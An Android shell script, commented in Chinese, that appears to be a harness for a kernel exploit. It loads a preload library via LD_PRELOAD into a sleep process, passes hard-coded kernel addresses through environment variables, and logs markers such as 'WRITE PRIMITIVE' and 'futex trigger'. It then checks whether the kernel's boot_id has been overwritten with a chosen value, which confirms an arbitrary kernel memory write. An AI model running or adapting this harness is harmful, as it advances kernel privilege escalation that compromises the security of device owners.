#!/system/bin/sh
# mt28b: 写形状验证 — tree_right=0xffffff80028a77e0 (标记)
# mode-2 成立 → boot_id = e0778a02-80ff-ffff (值=tree_right)
# 旧形状      → boot_id = 00778a02-80ff-ffff (值=tree_pc&~0xff)
SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt28.so
DST=/data/local/tmp/preload.so
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt28b.txt
RUNLOG=/data/local/tmp/mt28b_run.out
rm -f $DST; cp $SRC $DST; sync
echo "boot_before=$(cat /proc/sys/kernel/random/boot_id)" > $LOG
am kill-all 2>&1 | tail -1
echo "=== 3 轮独立进程 ==="
for R in 1 2 3; do
  echo "--- round $R start $(date +%H:%M:%S)" >> $LOG
  rm -f $RUNLOG
  timeout 220 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_RETRY=1 \
    PSELECT_TREE_PC=ffffff80028a77c8 \
    PSELECT_TREE_RIGHT=ffffff80028a77e0 \
    PSELECT_TREE_LEFT=0 \
    PSELECT_SKIP_WARMUP=1 \
    LD_PRELOAD=$DST /system/bin/sleep 180 > $RUNLOG 2>&1
  echo "round=$R rc=$?" >> $LOG
  BID=$(cat /proc/sys/kernel/random/boot_id)
  echo "round=$R boot_id=$BID" >> $LOG
  grep -a 'SLIDE page prepared\|WRITE PRIMITIVE\|futex trigger\|pselect returned\|stext=' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
  case "$BID" in
    e0778a02-*) echo "★★★ MODE-2 (value=tree_right) CONFIRMED round=$R ★★★" >> $LOG; break;;
    00778a02-*) echo "★★★ value=tree_pc&~0xff (old shape) round=$R ★★★" >> $LOG; break;;
  esac
  sleep 3
done
echo "=== boot_after=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
echo "=== DONE ===" >> $LOG
